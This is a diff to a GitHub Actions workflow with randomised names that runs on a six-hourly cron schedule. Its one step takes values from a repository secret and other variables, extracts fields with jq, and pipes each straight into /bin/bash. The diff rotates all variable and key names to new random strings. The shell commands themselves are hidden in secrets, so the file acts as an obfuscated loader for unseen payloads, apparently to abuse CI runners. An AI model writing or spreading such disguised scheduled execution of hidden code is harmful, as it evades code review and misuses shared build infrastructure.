@@ -1,23 +1,29 @@
 name: heqizheng6789
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-jobs:  # 17628
+    - cron: '23 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: heqizheng6789
         env:
-          vlv50: ${{ secrets.vlv50 }}
+          kgf032: ${{ secrets.kgf032 }}
         run: |
-          echo $vlv50 | jq -r .z7703 | /bin/bash
-          echo $oq2451 | jq -r .rzj3537 | /bin/bash
-          echo $va758 | jq -r .szbq20479 | /bin/bash
-          echo $yywnv5262 | jq -r .ztqqg1 | /bin/bash
-          echo $qaro32323 | jq -r .x0126 | /bin/bash
-          echo $mtc65 | jq -r .ok84691 | /bin/bash
-          echo $q26 | jq -r .n9659 | /bin/bash
+          echo $kgf032 | jq -r .jn69 | /bin/bash
+          echo $g07 | jq -r .zh2781 | /bin/bash
+          echo $wlgpo0 | jq -r .oimko3238 | /bin/bash
+          echo $abgu4111 | jq -r .p13038 | /bin/bash
+          echo $pfqn4873 | jq -r .vnmo507 | /bin/bash
+          echo $cdy86166 | jq -r .irar21191 | /bin/bash
+          echo $lzacy4 | jq -r .dcs7485 | /bin/bash
+          echo $w5251 | jq -r .oz72843 | /bin/bash
+          echo $f1579 | jq -r .hywbz02 | /bin/bash
+          echo $dz8252 | jq -r .qc88 | /bin/bash
+          echo $qze033 | jq -r .uqp7927 | /bin/bash
+          echo $xmp6 | jq -r .db3106 | /bin/bash
 
